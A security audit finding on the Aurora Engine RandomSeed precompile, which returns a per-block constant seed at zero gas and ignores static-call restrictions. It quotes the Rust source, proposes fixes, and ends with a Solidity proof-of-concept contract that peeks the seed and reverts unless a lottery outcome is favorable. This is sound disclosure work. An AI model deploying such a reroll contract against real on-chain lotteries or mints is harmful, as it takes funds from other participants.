### Title
RandomSeed Precompile Exposes Block-Level Constant as Randomness, Callable for Free in Static Context, Enabling Selective Transaction Commitment — (File: `engine-precompiles/src/random.rs`)

---

### Summary

The Aurora Engine `RandomSeed` precompile at address `0xc104f4840573bed437190daf5d2898c2bdf928ac` returns NEAR's block-level VRF seed unchanged. This seed is **identical for every transaction within the same NEAR block**. The precompile silently ignores the `is_static` flag, so it is callable in a static/view context at **zero gas cost**. An unprivileged attacker can read the current block's random seed via `eth_call` before committing any state-changing transaction, then selectively submit only when the randomness outcome is favorable — a classic "reroll until winning" attack.

---

### Finding Description

**Root cause 1 — Block-level constant, not per-transaction entropy.**

The `RandomSeed` precompile is instantiated once per block with the NEAR block's VRF seed and returns it verbatim for every call: [1](#0-0) 

The doc-comment itself admits the problem:

> "It will return the same seed if called multiple time in the same block." [2](#0-1) 

Because the seed is block-scoped, every EVM transaction in the same NEAR block sees the **same 32-byte value**. An attacker who reads it once knows the "random" value for every subsequent transaction in that block.

---

**Root cause 2 — `is_static` flag is silently ignored.**

The `Precompile::run` signature accepts `is_static: bool`, but the implementation names it `_is_static`, discarding it entirely: [3](#0-2) 

This means the precompile is callable inside a `STATICCALL` (or via `eth_call` RPC) with no restriction. An attacker can query the seed in a pure view call — no gas spent, no on-chain state change, no cost — and then decide whether to submit a real transaction.

---

**Root cause 3 — Zero gas cost.** [4](#0-3) 

`RANDOM_BYTES_GAS = EthGas::new(0)` makes repeated probing completely free.

---

**How the seed reaches the precompile.**

In the NEAR runtime path, `env::random_seed()` is called once per block and stored in the `Env`: [5](#0-4) 

The engine's `Backend` implementation exposes it as `block_randomness`: [6](#0-5) 

The same value is passed into `RandomSeed::new` and returned verbatim to any EVM caller.

---

### Impact Explanation

**Critical — Direct theft of user funds.**

Any Aurora-deployed contract that uses the `RandomSeed` precompile for security-critical randomness (lotteries, NFT random mints, random reward distribution, random operator/validator selection) is exploitable. An attacker can:

1. Call the precompile via `eth_call` (free, no state change) to learn the block seed.
2. Compute the outcome of the target contract's randomness logic off-chain.
3. Submit a real transaction only when the outcome is favorable (e.g., winning a lottery, minting a rare NFT, being selected as a privileged operator).

Alternatively, the attacker deploys a wrapper contract that reads the precompile, computes the outcome, and **reverts if unfavorable** — achieving the same reroll effect entirely on-chain with no wasted funds.

Because the seed is constant within a block, the attacker is guaranteed to succeed on the first attempt in any block where the seed produces a favorable outcome.

---

### Likelihood Explanation

**Medium-High.** The precompile is Aurora Engine's documented, production randomness interface. Its address is published and its purpose is explicitly described as an entropy source for contracts. Any protocol deployed on Aurora that relies on it for randomness — without additional per-transaction mixing — is immediately exploitable by any unprivileged EVM user with no special access. The attack requires only standard `eth_call` RPC access and basic arithmetic, with zero cost.

---

### Recommendation

1. **Mix block seed with per-transaction data.** Derive the effective random value as `keccak256(block_seed || tx.origin || tx.nonce || block_height)` inside the precompile, so each transaction receives a distinct value that cannot be pre-read via `eth_call`.

2. **Enforce `is_static` restriction.** Return an error (e.g., `ExitError::Other`) when `is_static == true`, preventing the seed from being read in view calls:
   ```rust
   if is_static {
       return Err(ExitError::Other("RandomSeed not available in static context".into()));
   }
   ```

3. **Assign non-zero gas cost.** Remove the `TODO(#483)` placeholder and assign a meaningful gas cost to deter free repeated probing.

4. **Document the limitation clearly.** Until a fix is deployed, document that the precompile returns a block-level constant and must not be used as the sole randomness source for any security-critical decision.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILottery {
    // Lottery uses RandomSeed precompile to pick winner
    function enter() external payable;
}

contract RandomSeedAttack {
    address constant RANDOM_SEED_PRECOMPILE =
        0xc104f4840573bed437190daf5d2898c2bdf928ac;

    // Step 1: Free view call — read the block seed before committing anything
    function peekSeed() external view returns (bytes32 seed) {
        (bool ok, bytes memory data) =
            RANDOM_SEED_PRECOMPILE.staticcall("");   // is_static ignored → succeeds
        require(ok);
        seed = abi.decode(data, (bytes32));
    }

    // Step 2: On-chain reroll — read seed, compute outcome, revert if unfavorable
    function attackLottery(address lottery, uint256 totalSlots, uint256 wantedSlot)
        external payable
    {
        (bool ok, bytes memory data) = RANDOM_SEED_PRECOMPILE.staticcall("");
        require(ok);
        bytes32 seed = abi.decode(data, (bytes32));

        // Replicate the lottery's randomness logic
        uint256 outcome = uint256(seed) % totalSlots;
        require(outcome == wantedSlot, "unfavorable — revert, no funds lost");

        // Only reaches here when outcome is favorable
        ILottery(lottery).enter{value: msg.value}();
    }
}
```

The attacker calls `attackLottery` repeatedly (or waits for a block where `peekSeed` shows a favorable seed) until the condition passes. Because the seed is constant within a block and the precompile costs zero gas, the attack is free to retry and guaranteed to succeed eventually.

### Citations

**File:** engine-precompiles/src/random.rs (L8-13)
```rust
mod costs {
    use crate::prelude::types::EthGas;

    // TODO(#483): Determine the correct amount of gas
    pub(super) const RANDOM_BYTES_GAS: EthGas = EthGas::new(0);
}
```

**File:** engine-precompiles/src/random.rs (L19-32)
```rust
impl RandomSeed {
    /// Random bytes precompile address
    /// This is a per-block entropy source which could then be used to create a random sequence.
    /// It will return the same seed if called multiple time in the same block.
    ///
    /// Address: `0xc104f4840573bed437190daf5d2898c2bdf928ac`
    /// This address is computed as: `&keccak("randomSeed")[12..]`
    pub const ADDRESS: Address = make_address(0xc104f484, 0x0573bed437190daf5d2898c2bdf928ac);

    #[must_use]
    pub const fn new(random_seed: H256) -> Self {
        Self { random_seed }
    }
}
```

**File:** engine-precompiles/src/random.rs (L39-58)
```rust
    fn run(
        &self,
        input: &[u8],
        target_gas: Option<EthGas>,
        context: &Context,
        _is_static: bool,
    ) -> EvmPrecompileResult {
        utils::validate_no_value_attached_to_precompile(context.apparent_value)?;
        let cost = Self::required_gas(input)?;
        if let Some(target_gas) = target_gas
            && cost > target_gas
        {
            return Err(ExitError::OutOfGas);
        }

        Ok(PrecompileOutput::without_logs(
            cost,
            self.random_seed.as_bytes().to_vec(),
        ))
    }
```

**File:** engine-sdk/src/near_runtime.rs (L384-391)
```rust
    fn random_seed(&self) -> H256 {
        unsafe {
            exports::random_seed(0);
            let mut bytes = H256::zero();
            exports::read_register(0, bytes.0.as_mut_ptr() as u64);
            bytes
        }
    }
```

**File:** engine/src/engine.rs (L1847-1850)
```rust
    /// Get environmental block randomness.
    fn block_randomness(&self) -> Option<H256> {
        Some(self.env.random_seed())
    }
```
